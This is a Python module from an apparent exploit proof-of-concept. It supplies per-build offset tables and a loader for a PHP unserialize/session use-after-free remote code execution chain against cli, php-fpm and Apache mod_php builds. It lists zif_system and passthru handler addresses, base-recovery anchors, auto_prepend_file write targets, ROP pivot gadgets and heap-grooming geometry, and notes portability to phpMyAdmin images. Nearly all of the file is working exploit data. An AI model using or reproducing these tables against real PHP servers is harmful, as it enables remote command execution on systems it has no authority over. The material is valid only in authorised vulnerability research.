"""Per-build exploit offset tables and the loader that selects one.

Holds BUILTIN_OFFSETS (per-build, per-SAPI offset tables keyed by
"<version>" or "<version>-<fpm|apache>"), CORPUS_FORGE_OFFSETS_REFERENCE
(a flag marking the corpus-sourced reference offsets recorded below the
table), and load_offsets().

load_offsets(version, sapi) -> dict
    Input: a PHP version string (the target's self-reported version) and an
    optional SAPI ("fpm-fcgi" or "apache2handler"); the fpm master/worker and
    the apache mod_php module are each a distinct binary from the cli php and
    get their own table, selected by SAPI.
    Lookup order: a matching offsets-<key>.json file at the poc/ root wins,
    otherwise the matching BUILTIN_OFFSETS entry; unknown builds raise.
    Output: a fresh dict with anchor_slots normalized to {slot_index: name}.

Offset table fields:
  bg_unserialize_off : &BG(unserialize).data (binbase-relative)
  zval_ptr_dtor      : the leak's chain-node destructor (binbase-relative)
  rodata_x           : chain-node +0x10 rodata pointer (binbase-relative)
  zif_system         : the rce round's written handler (binbase-relative)
  handler_off        : offsetof(zend_internal_function, handler)
                       (88 on 8.4 - zend_function has a refcounted gc header
                       there; 72 on 8.3 - no header)
  a_off/copy_off/sid_off : the request-heap layout around the freed
                       php_unserialize_data chunk A (chunk-relative)
  anchor_slots       : the leak's run-time-cache cluster, dump-offset
                       order -> internal function name (unser.php's INIT_FCALL
                       slots, freed-but-intact pages past the sid)
  anchor_deltas      : fn_X - fn_quotemeta per function (the [heap]
                       function-table layout is registration-order stable)

The 8.4.26 official cli image is built in; other builds load an
offsets-<version>.json (or offsets-<version>-<sapi>.json) file from the
poc/ root, derived once per build via dynsym + the php-src struct layout +
a /proc/<pid>/mem name-walk.
"""

import json
import os

# poc/ root: this module lives in poc/common/, one level down.
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# SAPI guardrail: core_globals / zif_system / basic_globals / executor_globals
# are per-binary and differ across cli / apache / fpm (e.g. core_globals
# 0x16e12e0 cli vs 0x132c600 apache vs 0x16e1580 fpm). NEVER merge or
# cross-apply such a value between the "<ver>", "<ver>-apache" and "<ver>-fpm"
# entries - doing so mis-derives binbase and silently breaks the fire.
BUILTIN_OFFSETS = {
    "8.4.26": {
        "bg_unserialize_off": 0x16cc3a0 + 872,
        "auto_prepend_off": 0x16e12e0 + 160,   # PG(auto_prepend_file) = core_globals+0xa0
        "auto_append_off": 0x16e12e0 + 168,    # PG(auto_append_file)  = core_globals+0xa8
        # Exported, slide-locked .bss engine-global vaddrs (binbase/pie-relative).
        # Any ONE leaked pointer of known class recovers pie_base (= leak - vaddr);
        # core_globals is also the PG(auto_prepend_file) write target, so one .bss
        # leak resolves both base and target. CLI binary ONLY - the apache mod_php
        # and fpm binaries have different .bss layouts; do NOT copy these vaddrs
        # into the -apache / -fpm keys.
        "bss_anchors": {
            "core_globals": 0x16e12e0, "executor_globals": 0x16e2020,
            "compiler_globals": 0x16e27e0, "sapi_globals": 0x16e1880,
            "basic_globals": 0x16cc3a0, "zend_signal_globals": 0x16e43e0,
            "zend_one_char_string": 0x16e54e0, "sapi_module": 0x16e1760,
            "php_rfc1867_callback": 0x16e1748,
        },
        "zval_ptr_dtor": 0x702260,
        "rodata_x": 0x1231b68,
        "zif_system": 0x508a70,
        "zif_quotemeta": 0x551ba0,
        "handler_off": 88,
        "a_off": 0x69000, "copy_off": 0x2000, "sid_off": -0x5FC0,
        "anchor_slots": ["file_exists", "str_repeat", "printf",
                         "file_get_contents", "ini_get",
                         "ini_parse_quantity", "memory_get_usage",
                         "unserialize"],
        "anchor_deltas": {"str_repeat": 0x1980, "printf": 0x97b0,
                           "file_exists": 0x7c60, "file_get_contents": 0x66a0,
                           "ini_get": -0x7b50, "ini_parse_quantity": -0x8180,
                           "memory_get_usage": 0x16b90, "unserialize": 0x16a30},
    },
    # The official php:8.4.26-fpm image's /usr/local/sbin/php-fpm is a
    # different binary from the cli image's /usr/local/bin/php (dynsym deltas
    # +0x1680 for ext/standard text, +0x2a0 for basic_globals; zif_* are
    # static so they were byte-matched against the cli functions). The
    # request-heap layout (a_off/copy_off/sid_off) is SAPI-independent (same
    # scripts, same in-container curl sequence). The [heap] function-table
    # registration shifts four anchor functions by -0x130 (one zend_function
    # group) - re-derived empirically via the /proc/<pid>/mem zif_quotemeta
    # scan. Selected via load_offsets(version, sapi).
    "8.4.26-fpm": {
        "bg_unserialize_off": 0x16cc640 + 872,
        "bg_unserialize_level_off": 0x16cc640 + 0x370,
        "ps_globals": 0x16cb7a0,          # PS(mod_data) = *(ps_globals+0x60)
        # Session-dangle file-write layout, VERIFIED black-box fresh-container
        # (flock-park, non-perturbing; see primitives/write/measure_psfiles_flock.py).
        # Chunk-relative (the 2MB request chunk base K), ASLR-independent.
        #   d       = BG(unserialize).data   @ chunk+0x6d000 (cochunk arm, 3 pages)
        #   E       = d->last (overflow var_entries) @ chunk+0x70000 (d+0x3000)
        #   ps_files= PS(mod_data)           @ chunk+0x56208 (last_key@+0, basedir@+8)
        # AIM_base for the var_push ps_files->basedir finisher:
        #   (ps_files - E - 0x10)/8 = (0x56208-0x70000-0x10)/8 = -13249.
        # NB: ps_files's chunk-offset is set in PS_OPEN and is stage-shape-dependent
        # (measured for a stage whose first $_POST field is a ~100-page carrier);
        # it is independent of upload_progress throttling. The gdb/ptrace value
        # (0x59078) is perturbed and does NOT transfer black-box.
        "d_choff": 0x6d000,
        "e_choff": 0x70000,
        "ps_files_choff": 0x56208,
        "ps_files_last_key_off": 0x00,
        "ps_files_basedir_off": 0x08,
        "php_session_flush": 0x4b8c60,
        "zval_ptr_dtor": 0x7038e0,
        "rodata_x": 0x12309a8,
        "zif_system": 0x50a0f0,
        "zif_quotemeta": 0x553220,
        "handler_off": 88,
        # PG(auto_prepend_file) PERSISTENT dispatch - php-fpm /usr/local/sbin/
        # php-fpm vaddrs (build #2, distinct from the cli "8.4.26" core_globals
        # 0x16e12e0 and the apache libphp 0x132c600 - see the SAPI guardrail
        # note below). Field +0xa0/+0xa8 source-stable (struct size 616).
        # bss_anchors = exported slide-locked globals for pie_base recovery
        # (leak - vaddr); pg_scratch_off..pg_scratch_limit = the zeroed/mapped
        # RW-PT_LOAD tail hole to park the include-path C-string.
        "core_globals_off": 0x16e1580,
        "auto_prepend_off": 0x16e1580 + 0xa0,   # 0x16e1620
        "auto_append_off": 0x16e1580 + 0xa8,    # 0x16e1628
        "pg_scratch_off": 0x16e8b00,
        "pg_scratch_limit": 0x16e9000,
        "bss_anchors": {
            "core_globals": 0x16e1580, "executor_globals": 0x16e22c0,
            "sapi_globals": 0x16e1b20, "basic_globals": 0x16cc640,
        },
        "a_off": 0x69000, "copy_off": 0x2000, "sid_off": -0x5FC0,
        "anchor_slots": ["file_exists", "str_repeat", "printf",
                         "file_get_contents", "ini_get",
                         "ini_parse_quantity", "memory_get_usage",
                         "unserialize"],
        "anchor_deltas": {"str_repeat": 0x1980, "printf": 0x9680,
                           "file_exists": 0x7b30, "file_get_contents": 0x6570,
                           "ini_get": -0x7b50, "ini_parse_quantity": -0x8180,
                           "memory_get_usage": 0x16a60, "unserialize": 0x16900},
    },
    # php:8.3.26-fpm (reference php-fpm target). text/.bss vaddrs
    # readelf-verified on the reference target's /usr/local/sbin/php-fpm (.dynsym present);
    # RVAs port 1:1 to phpmyadmin:5.2.3-fpm. Heap-layout keys deliberately omitted
    # (groom/memory_limit-dependent). The cookie over-read leak needs zval_ptr_dtor
    # + base anchors; the clean auto_append (.bss) finisher needs core_globals_off +
    # the field offsets. error_prepend_off (cg+0x98) is the fake-free tmp_var
    # dtor-lever's last_dtor target (INI default NULL -> used_slots S=0 -> the write
    # lands exactly at auto_append_off; verify error_prepend_string unset on target).
    "8.3.26-fpm": {
        "bg_unserialize_off": 0x161c580 + 0x358,   # basic_globals + 0x358
        "zval_ptr_dtor": 0x57a790,                  # cookie over-read binbase anchor
        "php_url_encode": 0x4c0150,                 # session.c send_cookie over-read site
        "php_session_flush": 0x4344c0,
        "php_var_unserialize": 0x4d8c90,
        "core_globals_off": 0x16203e0,
        "error_prepend_off": 0x16203e0 + 0x98,      # 0x1620478 (fake-free last_dtor target)
        "auto_prepend_off": 0x16203e0 + 0xa0,       # 0x1620480
        "auto_append_off": 0x16203e0 + 0xa8,        # 0x1620488 (clean persistent dispatch)
        "input_encoding_off": 0x16203e0 + 0xb0,     # 0x1620490 (IS_LONG collateral; benign)
        "ps_globals_off": 0x160a580,                # PS(mod_data) = *(ps_globals+0x60)
        "bss_anchors": {
            "core_globals": 0x16203e0, "executor_globals": 0x1620e40,
            "basic_globals": 0x161c580, "ps_globals": 0x160a580,
        },
    },
    # The php:8.4.26-apache image's mod_php /usr/lib/apache2/modules/libphp.so
    # is a THIRD binary (distinct from the cli php and the php-fpm one); its
    # dynsym gives different text offsets. load_offsets selects this table for
    # the apache2handler SAPI (else the leak/fire mis-derives binbase by ~0xa3700).
    # The request-heap layout (a_off/copy_off/sid_off) is SAPI-independent (same
    # scripts + in-container curl sequence). zif_*, basic_globals from nm
    # libphp.so. The [heap] anchor_deltas are PROVISIONAL for the /proc-seeded rce
    # round on apache (chunk-only does not use them).
    "8.4.26-apache": {
        "bg_unserialize_off": 0x13176c0 + 872,
        "zval_ptr_dtor": 0x65eb60,
        "rodata_x": 0x1093228,
        "zif_system": 0x465370,
        "zif_quotemeta": 0x4ae4a0,
        "handler_off": 88,
        # 9bie-family forge-fire offsets (the live-carrier / forward-HT
        # port). zend_array_destroy (libphp+0x613b40): some corpus exploits
        # anchor the fake array on it instead of zval_ptr_dtor. htdata/
        # fake_array_S/hsv are CHUNK(main)-relative groom geometry (NOT libphp
        # offsets), calibrated for the 128M production profile - apply them
        # against the derived chunk base, not binbase.
        "zend_array_destroy": 0x613b40,
        "htdata_off": 0x690d8,      # chunk-rel live-string carrier (= a_off+0xd8)
        "fake_array_S": 0xf8398,    # chunk-rel forged zend_array S (128M)
        "hsv_off": 0x7d720,         # chunk-rel http_session_vars (128M)
        "a_off": 0x69000, "copy_off": 0x2000, "sid_off": -0x5FC0,
        "anchor_slots": ["file_exists", "str_repeat", "printf",
                         "file_get_contents", "ini_get",
                         "ini_parse_quantity", "memory_get_usage",
                         "unserialize"],
        "anchor_deltas": {"str_repeat": 0x1980, "printf": 0x97b0,
                           "file_exists": 0x7c60, "file_get_contents": 0x66a0,
                           "ini_get": -0x7b50, "ini_parse_quantity": -0x8180,
                           "memory_get_usage": 0x16b90, "unserialize": 0x16a30},
        # PG(auto_prepend_file) PERSISTENT dispatch - APACHE libphp.so vaddrs
        # (build #3). Field +0xa0/+0xa8 source-stable (struct size 616).
        # bss_anchors = exported slide-locked globals for pie_base recovery
        # (leak - vaddr); pg_scratch_off = a zero-filled mapped .bss tail hole
        # to park the include-path C-string. LIBPHP-relative - do NOT confuse
        # with the cli "8.4.26" core_globals 0x16e12e0.
        "core_globals_off": 0x132c600,
        "auto_prepend_off": 0x132c600 + 0xa0,
        "auto_append_off": 0x132c600 + 0xa8,
        "pg_scratch_off": 0x1333500,
        "bss_anchors": {
            "core_globals": 0x132c600, "executor_globals": 0x132d340,
            "compiler_globals": 0x132db00, "sapi_globals": 0x132cba0,
            "basic_globals": 0x13176c0, "sapi_module": 0x132ca80,
            "zend_signal_globals": 0x132f700, "zend_one_char_string": 0x1330800,
            "php_rfc1867_callback": 0x132ca68,
        },
        # jump_fcontext -> ROP -> zif_passthru -> _zend_bailout WORKER-SURVIVING
        # dispatch. All libphp-relative, nm+objdump-verified; pivot =
        # jump_fcontext+0x2e (`mov %rdi,%rsp`). zif_passthru == zif_system+0x10.
        # exec_range = the executable PT_LOAD for validate(). Live
        # worker-survival not yet confirmed.
        "survive_dispatch": {
            "jump_fcontext": 0x4f8140, "pivot": 0x4f816e,
            "zif_passthru": 0x465380, "zend_bailout": 0x1b15cc,
            "pop_rdi": 0x166cb7, "pop_rsi": 0x165728,
            "pop_rsi_rbp": 0x3a5dbe, "ret": 0x166cb8,
            "exec_range": (0x156000, 0x6684ad),
        },
    },
    # Official php:8.5-apache image (= 8.5.12, the PATCHED 8.5 release where the
    # app-gadget / unserialize-UAF routes still land). PARTIAL by design: it
    # carries the forge-fire fields the leak+fire need (zval_ptr_dtor,
    # zif_system, ...), but the /proc-seeded request-heap layout
    # (a_off/copy_off/sid_off) and the [heap] anchor_slots/deltas are NOT
    # derived - the /proc-seeded rce targets vulnerable builds, and 8.5.12 is
    # patched, so a layout lookup against this key KeyErrors loudly rather than
    # mis-fire.
    "8.5.12-apache": {
        "bg_unserialize_off": 0x17729e0 + 0x368,
        "zval_ptr_dtor": 0x7c11a0,
        "rodata_x": 0x149a800,       # uninitialized_bucket(0x149a7f8) + 8
        "zif_system": 0x59fae0,
        "zif_quotemeta": 0x5eacf0,
        "zend_array_destroy": 0x7752a0,
        "handler_off": 88,           # same zend_function gc-header shape as 8.4; read/fire-only, unverified on 8.5
        # jump_fcontext worker-surviving dispatch gadgets, nm+objdump-verified
        # on this libphp.so. pivot = jump_fcontext+0x2e. zif_passthru ==
        # zif_system+0x10. PG/core_globals not derived for 8.5.12 yet.
        "survive_dispatch": {
            "jump_fcontext": 0x652230, "pivot": 0x65225e,
            "zif_passthru": 0x59faf0, "zend_bailout": 0x1eb03b,
            "pop_rdi": 0x198309, "pop_rsi": 0x196c35,
            "pop_rsi_rbp": 0x3ee49e, "ret": 0x19830a,
            "exec_range": (0x184000, 0x7caec1),
        },
        "_partial": "forge-fire only; var_hash_rw heap-layout + anchors not derived",
    },

    # var_hash UAF (CVE-2026-109618) cross-version offsets. readelf
    # ground-truth on stock php:X-{apache,fpm} images. Scoped to the UAF
    # (_partial): heap-layout/anchors NOT derived for these builds. GPF rule:
    # gpf_handler_off=192 (0xC0) on 8.1-8.4, 200 (0xC8) on 8.5 (sizeof
    # std_object_handlers 200 vs 208). SPRAY_LEN=280/COUNT=32/NUM_PROPS=8 are
    # version-INVARIANT. uid-fire confirmed on 8.4.26/8.5.11/8.5.12; 8.1/8.2/8.3
    # vuln+resolve confirmed, uid-fire not yet landed. DO NOT cross-apply a
    # value to a different build.
    "8.1.34-apache": {"zval_ptr_dtor": 0x457150, "zif_system": 0x36f470,
        "std_object_handlers": 0xeedca0, "executor_globals": 0xf12c20,
        "zend_standard_class_def": 0xf135e8, "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
    "8.1.34-fpm": {"zval_ptr_dtor": 0x5388d0, "std_object_handlers": 0x13ff4c0,
        "executor_globals": 0x1421500, "zend_standard_class_def": 0x1421ec8,
        "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
    "8.2.35-apache": {"zval_ptr_dtor": 0x491910, "zif_system": 0x3a1da0,
        "std_object_handlers": 0xf37ba0, "executor_globals": 0xf5ca40,
        "zend_standard_class_def": 0xf5d448, "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
    "8.2.35-fpm": {"zval_ptr_dtor": 0x56fb10, "std_object_handlers": 0x13ff4a0,
        "executor_globals": 0x1421140, "zend_standard_class_def": 0x1421b48,
        "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
    "8.3.36-apache": {"zval_ptr_dtor": 0x4a9510, "zif_system": 0x3b2a00,
        "std_object_handlers": 0x1041b20, "executor_globals": 0x1066c80,
        "zend_standard_class_def": 0x1067688, "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
    "8.3.36-fpm": {"zval_ptr_dtor": 0x585790, "std_object_handlers": 0x15ff480,
        "executor_globals": 0x1620e40, "zend_standard_class_def": 0x1621848,
        "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
    "8.4.27-apache": {"zval_ptr_dtor": 0x66a620, "zif_system": 0x46ad70,
        "std_object_handlers": 0x1252620, "executor_globals": 0x1339460,
        "zend_standard_class_def": 0x133f508, "gpf_handler_off": 192,
        "_partial": "a7-only (1b readelf); var_hash_rw layout not derived"},
}


# Corpus-sourced forge-fire reference offsets (apache mod_php and fpm). NOT
# wired into load_offsets: they are UNVERIFIED on our builds and are distro/
# minor specific. Promote one into BUILTIN_OFFSETS only after gdb-grounding it
# on the matching image (in-container `gdb -p <worker>`, libphp base from
# /proc/<pid>/maps, subtract to get each offset).
#   8.4.25-apache (trixie,   JoasASantos) zif_system=0x465240 zval_ptr_dtor=0x65ea30
#   8.3.35-apache (trixie,   3em0)        zif_system=0x3ac080 zval_ptr_dtor=0x49ec50
#   8.3.35-apache (bookworm, JoasASantos) zif_system=0x44f890 zval_ptr_dtor=0x63b5a0
#   8.5.11-apache (dinosn)                zif_system=0x5996e0 zend_array_destroy=0x769080
#   8.5.11-apache zval_ptr_dtor=0x7b47a0  zif_system=0x5996e0 zend_array_destroy=
#     0x769080 (readelf on the php:8.5.11-apache libphp.so, sha 2c80ca2a245c).
#     REFERENCE ONLY - gdb-ground on our image before promoting.
#
# FOREIGN-BUILD sets: confirmed to be for a DIFFERENT binary than ours, recorded
# so the derivation is not lost. They MUST NOT be cross-applied to our tables
# (doing so mis-derives binbase). Promote only after gdb-grounding on that image.
#   8.4.26-apache  DEBIAN APT libphp8.4.so (NOT the php.net image - a 4th distinct
#                  8.4.26 binary): zif_system=0x24d710 zval_ptr_dtor=0x426130
#                  php_session_initialize=0x1f6d30 zend_hash_destroy=0x3da670
#                  php_url_encode=0x2a5110 (re-derive via the
#                  libapache2-mod-php8.4-dbgsym build-id -> nm recipe).
#   8.5.4 (jump_fcontext->ROP->passthru worker-SURVIVING dispatch):
#                  pivot=jump_fcontext+0x32 lab 0x74a6b2 / docker 0x72c462;
#                  mbfl base lab 0x17ecbe0 / docker 0x1811be0 (0x720 rodata pair
#                  signature is build-stable); s_off_fz=0x6c398 s_off_u8=0xf6558.
#   8.5.4-0ubuntu1 (pDestructor=ZEND_CALL_FUNCTION->named passthru):
#                  ZEND_CALL_FUNCTION=0x52a350 DEFAULT_DOFF=0x76f00
#                  DEFAULT_HTOFF=0x2e8 BASE_DELTAS=(0x1800000,0x1a00000).
#
# FOREIGN-BUILD FPM sets (a php.net/Debian user-prefix php-fpm, CVE-2026-109619
# BG(unserialize) stale-state lane - a DIFFERENT bug AND a different binary from
# our CachedData-spray fpm chain). Vendored in full as
# offsets-vabismo-8.4.{25,26}-fpm.json (named so load_offsets never
# auto-selects them). PIE/image-relative:
#   8.4.26-fpm zif_system=0x386660 zval_ptr_dtor=0x54a0d0 basic_globals=0xa04660
#   8.4.25-fpm zif_system=0x386460 zval_ptr_dtor=0x549890 basic_globals=0xa04660
# NOT our image: our BUILTIN_OFFSETS['8.4.26-fpm'] has zif_system=0x50a0f0,
# zval_ptr_dtor=0x7038e0 for the SAME version, so the binaries differ; do NOT
# cross-apply. Promote only after gdb-grounding on the php.net/debian image.
# The distinct contribution is a one-read dual-base leak (chunk ptr @
# window+0x77f8 -0x8b000, PIE ptr @ window+0x157e8 -0x4ea787, one echoed OOB
# string).
CORPUS_FORGE_OFFSETS_REFERENCE = True  # documentation marker; see comment above


def load_offsets(version, sapi=None):
    """Offsets table for a PHP build (auto-selected from the target's
    self-reported version; the fpm SAPI binary gets its own table)."""
    key = version
    # SAPI-specific binary tables: the fpm master/worker and the apache mod_php
    # module are each a distinct build from the cli php, with their own text
    # offsets (zval_ptr_dtor etc.). Select the matching table by SAPI.
    sapi_suffix = {"fpm-fcgi": "fpm", "apache2handler": "apache"}.get(sapi)
    if sapi_suffix:
        sapi_key = f"{version}-{sapi_suffix}"
        sapi_path = os.path.join(_POC_ROOT, f"offsets-{sapi_key}.json")
        if os.path.exists(sapi_path) or sapi_key in BUILTIN_OFFSETS:
            key = sapi_key
    path = os.path.join(_POC_ROOT, f"offsets-{key}.json")
    if os.path.exists(path):
        with open(path) as f:
            off = json.load(f)
    elif key in BUILTIN_OFFSETS:
        off = dict(BUILTIN_OFFSETS[key])
    else:
        raise SystemExit(f"[offsets] no offsets table for PHP {key} "
                         f"(write poc/offsets-{key}.json - see README)")
    slots = off.get("anchor_slots")
    if isinstance(slots, list):          # builtin form: [name, ...] by slot
        off["anchor_slots"] = {i: n for i, n in enumerate(slots)}
    elif isinstance(slots, dict):        # json form: {"0": name, ...}
        off["anchor_slots"] = {int(i): n for i, n in slots.items()}
    return off


# Chunk-relative finisher geometry for the Apache mod_php session-decode-UAF write
# (poc/chains/apache_purehttp_rce.py; kengwang ps_files->basedir two-push forge). All offsets are
# relative to the 2 MiB ZendMM request chunk (K cancels in the AIM), so ASLR/memory_limit-invariant:
#   ps_files_chunkoff  - ps_files (PS(mod_data)) offset in the chunk
#   e_off              - the dangling var_entries (E) block offset; AIM = (ps_files-E-0x10)/8
#   carrier_e          - E - DT (the stage carrier re-occupies [DT .. E])
# Derived on php:8.4.26-apache (gdb, OBSERVE-only). The pure-HTTP huge-pressure arm
# (groom.huge_alloc_pressure) reproduces the SAME geometry as the big-session (genA_big) arm, so
# these values serve both.
# 8.3.26: e_off is gdb-derived; ps_files_chunkoff and carrier_e are unverified (inherited from 8.4.26).
APACHE_SEAT_GEOM = {
    "8.4.26": {"ps_files_chunkoff": 0x54208, "e_off": 0x93000, "carrier_e": 0x27000},
    "8.3.26": {"ps_files_chunkoff": 0x54208, "e_off": 0x94000, "carrier_e": 0x27000},
}
